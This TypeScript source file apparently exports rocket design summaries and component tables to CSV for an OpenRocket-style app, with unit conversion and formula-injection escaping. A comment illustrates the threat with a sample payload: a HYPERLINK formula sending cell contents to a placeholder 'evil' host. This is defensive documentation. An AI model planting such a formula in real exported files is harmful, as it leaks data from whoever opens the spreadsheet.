import type { StaticInfo } from '../../engine/openRocketEngine';
import type { MaterialDensity, ReportModel } from './reportModel';
import { exportFilename, saveText } from '../files/saveFile';
import { siToUi, type Quantity, type UnitSelection } from '../../prefs/units';
import { plainDecimal } from '../files/numberText';
import { sig4, staticInfoRows } from './designInfo';
import { type StatKey } from './designInfo';
import { csvField } from '../exports/csvCell';
import { CSV_MIME } from '../exports/csvExport';
import i18n from '../../i18n';
import { partLabel } from '../../i18n/format';

/**
 * Design-info CSV export: the same Scope / Field / Value / Unit layout
 * OpenRocket writes: a Design block, the whole-Rocket summary, one block per
 * stage, then each fin set's axial position. Field names are stable English
 * data identifiers (not localized), except that a fin set's position rows, on a
 * stage with more than one fin set, open with the part's label: its own name,
 * or for an unnamed one its type's name in the UI language. Values are in the
 * units the user has chosen, which every row names in its own Unit column.
 * Values use '.' as the decimal separator regardless of locale.
 */

/** Number → clean string with a fixed max decimals and a '.' decimal point. */
const round = (v: number, d: number): string => plainDecimal(v, d);

/**
 * An SI figure in the chosen unit, to six significant figures. A fixed count of
 * decimals is wrong in one unit or another: three decimals write a 0.5 mm wall
 * in meters as 0.001. A figure the kernel could not give is a blank cell, as in
 * every CSV the app writes, never the UI's no-value glyph in a numeric column.
 */
const fig = (q: Quantity, symbol: string, si: number): string => {
  if (!Number.isFinite(si)) return '';
  const v = Number(siToUi(q, symbol, si).toPrecision(6));
  // Plain decimal, never an exponent, which a spreadsheet may read as text:
  // `String` writes one below 1e-6.
  const s = v.toFixed(12).replace(/\.?0+$/, '');
  return s === '-0' ? '0' : s;
};

/**
 * RFC-4180 cell, with spreadsheet formula injection neutralized by the rule
 * every CSV writer shares (`csvField`).
 *
 * Values here are file-sourced: `model.name` is the `<name>` of an imported
 * `.ork` and the fin-set and part labels are its node names. A rocket named
 * `=HYPERLINK("http://evil/?"&A1,"Open")`, or `x;=HYPERLINK(...)` read in a
 * locale that splits on `;`, would otherwise execute when the exported CSV is
 * opened in Excel or Sheets. Figures go through the same function and stay
 * numeric, negatives included.
 *
 * A lone `\r` is quoted too: the file's own terminator is `\r\n`, so an
 * unquoted bare CR inside a name splits the record for RFC-4180 readers.
 */
const cell = (s: string): string => csvField(s);

/** [field, value, unit] rows for one summary, in the user's units. */
function summaryRows(info: StaticInfo, units: UnitSelection): [string, string, string][] {
  // `fig`, not the locale-aware formatter: this is a data file, and its
  // decimal separator must not move with the UI language.
  const len = (si: number): [string, string] => [fig('length', units.length, si), units.length];
  const mass = (si: number): [string, string] => [fig('mass', units.mass, si), units.mass];
  const cellFor = (key: StatKey, v: number): [string, string] => {
    switch (key) {
      case 'massEmpty':
      case 'massLoaded':
        return mass(v);
      case 'fineness':
        return [round(v, 2), ''];
      case 'stabilityCal':
        return [round(v, 2), 'cal'];
      case 'stabilityPct':
        return [round(v, 1), '%'];
      case 'cd':
        return [round(v, 3), ''];
      case 'cna':
        return [round(v, 2), '/rad'];
      case 'pitchInertia':
      case 'rollInertia':
        // Significant figures, not fixed decimals: a small rocket's roll inertia
        // is around 1e-7 kg·m², which six decimals would write as 0.
        return [Number.isFinite(v) ? sig4(v) : '', 'kg·m²'];
      default:
        return len(v);
    }
  };
  // Which rows exist is staticInfoRows' call, shared with the .ork and the PDF.
  return staticInfoRows(info).map(({ key, field, value }) => [field, ...cellFor(key, value)]);
}

/**
 * The desktop's label for each design type (core messages.properties,
 * `DesignType.*`), keyed by the token with its underscores removed, which is
 * how the desktop stores it and how this app's tokens compare to it. This file
 * is English throughout, so the label is too.
 */
const DESIGN_TYPE_LABEL: Record<string, string> = {
  original: 'Original Design/Other',
  commercialkit: 'Commercial Kit',
  clonekit: 'Clone of Commercial Kit',
  upscalekit: 'Upscale of Commercial Kit',
  downscalekit: 'Downscale of Commercial Kit',
  modifiedkit: 'Modification of a Commercial Kit',
  kitbash: 'Kit Bash of Commercial Kits',
};

/** A design type token as the desktop names it; an unknown token is shown as it is. */
const designTypeLabel = (token: string | undefined): string =>
  token ? (DESIGN_TYPE_LABEL[token.toLowerCase().replace(/_/g, '')] ?? token) : DESIGN_TYPE_LABEL['original']!;

/** The full design-info CSV as a string. */
export function buildDesignCsv(model: ReportModel, units: UnitSelection): string {
  const lines: string[] = ['Scope,Field,Value,Unit'];
  const push = (scope: string, field: string, value: string, unit: string) =>
    lines.push([scope, field, value, unit].map(cell).join(','));

  push('Design', 'Name', model.name, '');
  push('Design', 'Design Type', designTypeLabel(model.designType), '');
  push('Design', 'Stages', String(model.stages.length), '');

  for (const [field, value, unit] of summaryRows(model.whole.info, units)) push('Rocket', field, value, unit);
  for (const st of model.stageSummaries)
    for (const [field, value, unit] of summaryRows(st.info, units)) push(st.label, field, value, unit);

  for (const st of model.finSetsByStage) {
    for (const s of st.sets) {
      // The field stays an English identifier; the part's name in it is the
      // part's own, or its type's name for an unnamed one.
      const label = st.sets.length > 1 ? `${partLabel(i18n.t, s)}: ` : 'Fin set: ';
      push(st.stage, `${label}Nose to top of fin root`, fig('length', units.length, s.topX), units.length);
      push(st.stage, `${label}Nose to bottom of fin root`, fig('length', units.length, s.bottomX), units.length);
    }
  }

  return lines.join('\r\n') + '\r\n';
}

/** The component table's density columns, in order: bulk, surface, line. */
const DENSITY_KINDS: readonly MaterialDensity[] = ['density', 'surfaceDensity', 'lineDensity'];

/**
 * The component table: one row per part, stage by stage in tree order, with the
 * figures the PDF's parts list shows. Diameters rather than radii, the way the
 * desktop's dialogs give them; every value in the user's units, which the header
 * names. A figure a part does not have is left blank.
 *
 * `partName` turns a part type into the reader's word for it; it is passed in
 * because this service has no translator.
 */
export function buildComponentCsv(
  model: ReportModel,
  units: UnitSelection,
  partName: (type: string) => string,
): string {
  const lines = [
    [
      'Stage',
      'Depth',
      'Type',
      'Name',
      'Material',
      `Density (${units.density})`,
      `Surface density (${units.surfaceDensity})`,
      `Line density (${units.lineDensity})`,
      `Length (${units.length})`,
      `Outer diameter (${units.length})`,
      `Inner diameter (${units.length})`,
      `Fore diameter (${units.length})`,
      `Aft diameter (${units.length})`,
      `Thickness (${units.length})`,
      `Mass (${units.mass})`,
    ].join(','),
  ];
  const len = (m: number | undefined) => (m == null ? '' : fig('length', units.length, m));
  const dia = (r: number | undefined) => (r == null ? '' : len(2 * r));
  for (const st of model.partsByStage) {
    for (const p of st.rows) {
      lines.push(
        [
          cell(st.stage),
          String(p.depth),
          cell(partName(p.type)),
          cell(p.name),
          cell(p.material ?? ''),
          // One column per kind of density, so each column has one unit.
          ...DENSITY_KINDS.map((k) =>
            p.density == null || (p.densityKind ?? 'density') !== k ? '' : fig(k, units[k], p.density),
          ),
          len(p.length),
          dia(p.outerR),
          dia(p.innerR),
          dia(p.foreR),
          dia(p.aftR),
          len(p.thickness),
          fig('mass', units.mass, p.mass),
        ].join(','),
      );
    }
  }
  return lines.join('\r\n') + '\r\n';
}

/** Build and download the component table. */
export function downloadComponentCsv(
  model: ReportModel,
  units: UnitSelection,
  partName: (type: string) => string,
): void {
  void saveText(buildComponentCsv(model, units, partName), exportFilename([model.name, 'parts'], 'csv'), CSV_MIME);
}

/** Build and download the design-info CSV. */
export function downloadDesignCsv(model: ReportModel, units: UnitSelection): void {
  void saveText(buildDesignCsv(model, units), exportFilename([model.name, 'design'], 'csv'), CSV_MIME);
}
